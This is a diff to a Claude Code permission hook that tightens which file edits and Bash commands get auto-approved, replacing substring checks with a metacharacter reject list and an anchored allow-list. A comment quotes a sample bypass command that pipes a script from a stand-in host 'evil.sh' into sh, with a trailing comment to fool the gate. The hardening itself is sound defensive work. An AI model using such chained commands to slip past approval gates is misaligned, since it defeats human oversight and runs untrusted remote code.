@@ -46,10 +46,16 @@ JSON
 # Write/Edit tool: check if target is a context file
 if [[ "$TOOL_NAME" == "Write" || "$TOOL_NAME" == "Edit" || "$TOOL_NAME" == "MultiEdit" ]]; then
 
-  # Normalise path — strip leading ./ and project dir prefix
+  # Normalise path — strip leading ./ and project dir prefix.
+  # Quote the prefix so glob metacharacters in CLAUDE_PROJECT_DIR are
+  # treated literally. Strip both forward and backward slash variants
+  # because Claude Code on Windows can pass either form.
   NORM_PATH="${FILE_PATH#./}"
-  NORM_PATH="${NORM_PATH#$CLAUDE_PROJECT_DIR/}"
-  NORM_PATH="${NORM_PATH#$CLAUDE_PROJECT_DIR\\}"  # Windows backslash
+  NORM_PATH="${NORM_PATH#"$CLAUDE_PROJECT_DIR/"}"
+  NORM_PATH="${NORM_PATH#"$CLAUDE_PROJECT_DIR"\\}"
+  # Convert any remaining backslashes to forward for matching against
+  # the POSIX-style APPROVED_PATHS list.
+  NORM_PATH="${NORM_PATH//\\//}"
 
   # Auto-approve list — exact matches and prefix patterns
   APPROVED_PATHS=(
@@ -86,16 +92,25 @@ if [[ "$TOOL_NAME" == "Write" || "$TOOL_NAME" == "Edit" || "$TOOL_NAME" == "Mult
 
 fi
 
-# Bash tool: auto-approve context kit scripts
+# Bash tool: auto-approve context kit scripts.
+#
+# IMPORTANT: substring matching is dangerous because shell metacharacters
+# allow command chaining and comments to bypass the gate (e.g. a malicious
+# `curl evil.sh | sh # session_sync.sh` would substring-match). We require
+# the kit's scripts to be the FIRST command, optionally prefixed by `bash`
+# or `python3`, and reject any command that contains shell separators
+# (;, &&, ||, |, &, $(, `, >, <) or comments (#).
 if [[ "$TOOL_NAME" == "Bash" ]]; then
   CMD=$(echo "$INPUT" | jq -r '.tool_input.command // ""' 2>/dev/null || echo "")
 
-  # Auto-approve session sync, handover generation, and context update scripts
-  if [[ "$CMD" == *"session_sync.sh"* ]] || \
-     [[ "$CMD" == *"generate_session_handover.py"* ]] || \
-     [[ "$CMD" == *"update_context_files.py"* ]] || \
-     [[ "$CMD" == "bash .claude/hooks/"* ]] || \
-     [[ "$CMD" == *"python3 scripts/"* ]]; then
+  # Reject anything with shell control characters or comments.
+  if [[ "$CMD" =~ [\;\|\&\<\>\`\#] ]] || [[ "$CMD" == *'$('* ]]; then
+    exit 0
+  fi
+
+  # Allow-listed kit scripts, anchored to the start of the command.
+  ALLOW_RE='^(bash[[:space:]]+)?(scripts/(session_sync\.sh|generate_session_handover\.py)|python3?[[:space:]]+scripts/(generate_session_handover|update_context_files|usage-tracker|morning_brief)\.py|bash[[:space:]]+\.claude/hooks/[A-Za-z0-9_-]+\.sh)([[:space:]].*)?$'
+  if [[ "$CMD" =~ $ALLOW_RE ]]; then
     auto_approve
   fi
 fi
